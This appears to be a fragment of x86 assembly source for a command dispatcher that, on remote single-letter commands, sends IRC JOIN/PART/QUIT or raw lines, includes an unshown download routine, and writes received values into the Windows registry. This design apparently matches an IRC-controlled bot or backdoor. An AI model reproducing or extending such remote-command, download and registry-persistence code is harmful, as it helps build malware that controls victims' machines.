; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               Command processor

cmdprocess:	lea	edi, [writebuffer]
		mov	al, [esi]		; al = command
		add	esi, 2
		cmp	al, "j"
		jz	.join
		cmp	al, "p"
		jz	.part
		cmp	al, "q"
		jz	.quit
		cmp	al, "r"
		jz	.raw
		cmp	al, "d"
		jz	.download
		cmp	al, "s"
		jz	.setsettings
		ret
.join:		mov	dword [edi], "JOIN"
.joinpart:	mov	byte [edi+4], " "
		add	edi, 5
.raw:		stdcall	copystring,edi,esi
		lea	eax, [writebuffer]
		stdcall	sendstring,eax
		ret
.part:		mov	dword [edi], "PART"
		jmp	.joinpart
.quit:		lea	eax, [writebuffer]
		mov	dword [eax], "QUIT"
		mov	dword [eax+4], 10
		stdcall	sendstring,eax
		invoke	ExitProcess,0
		ret
		include 'download.inc'
.setsettings:	xor	eax, eax
.ssize:		inc	eax
		cmp	byte [esi+eax-1], 10
		jnz	.ssize
		mov	byte [esi+eax-1], 0
		invoke	RegSetValueEx,[inithandle],0,0,REG_SZ,esi,eax
		ret